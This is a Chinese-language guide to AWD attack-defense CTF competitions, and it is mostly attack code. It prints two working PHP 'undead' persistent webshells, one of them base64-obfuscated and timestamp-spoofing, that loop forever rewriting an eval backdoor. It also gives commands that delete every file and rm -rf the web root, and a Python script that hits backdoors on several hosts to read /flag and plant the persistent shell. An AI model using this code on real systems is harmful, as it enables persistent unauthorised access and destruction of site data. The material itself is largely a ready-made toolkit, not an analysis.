AWD简介

AWD攻防战,出题方会给每个队伍部署同样环境的主机，每个队伍的主机里都有flag，攻击别人的靶机以取得别人的flag提交来得分，本机的flag被别人提交会被扣分。因此要在攻击别人的机器的同时要防御好自己的机器避免被别人攻破。也就是真正的攻防实战.

环境配置（挂代理

根据所给的数据配置一下代理

开始

  1. ssh连接一下自己的服务器

  1. 然后大概走一遍备份之类的流程

  2. 开始代码审计，挖洞。一顿操作猛如虎拿到了webshell之后嘞，就是要维持权限，也就是通过所拿到的后门上传一个不死马或者反弹shell

    不死马

    不死马，顾名思义就是在执行后会不断生成一个shell文件来维持权限的存在
    先放一个网上流行的不死马

    <?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '2.php';
$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
while (1){
 file_put_contents($file,$code);
 system('touch -m -d "2018-12-01 09:10:12" .2.php');
 usleep(5000);
} 
?>

    以及一个升级版不死马

    <?php
ignore_user_abort(true);
set_time_limit(0);
$file = 'c.php';
$code = base64_decode('PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+');
while(true) {
  if(md5(file_get_contents($file))===md5($code)) {
      file_put_contents($file, $code);
  }
  usleep(50);
}
?>
上传不死马

利用一下刚刚的webshell将不死马上传至服务器并访问一下让它跑起来
这边是直接使用hackbar将不死马上传

其他操作

刚刚拿到的webshell可以拿来上传不死马也可以拿来做其他的操作，例如删除网站或者删除一下文件

删除文件

使用global语法删除文件
array_map('unlink', glob('*'));

删除网站

使用system调用系统命令
system（'cd ../../../ && rm -rf /web'）

批量化脚本
import requests
url = "http://192.168.238.132:880"
shell = "/shell.php"
passwd = "aaa"
port = ""
payload = {passwd: 'system(\'cat /flag\');'}
payload2 = {shell: 'ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = '2.php';$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';while (1){file_put_contents($file,$code);usleep(5000);}'}
for i in range(1,6):
    url1 = url+str(i)+shell
    try:
        r=requests.post(url1,payload,timeout=1)
        if(r.status_code==requests.codes.ok):
            print(url1+" flag is :"+r.text)
        else:
            print("web connect failed")
    except:
        print("shell connect failed")
    try:
        r=requests.post(url1,payload2,timeout=1)
    except:
        print("shell insert failed")
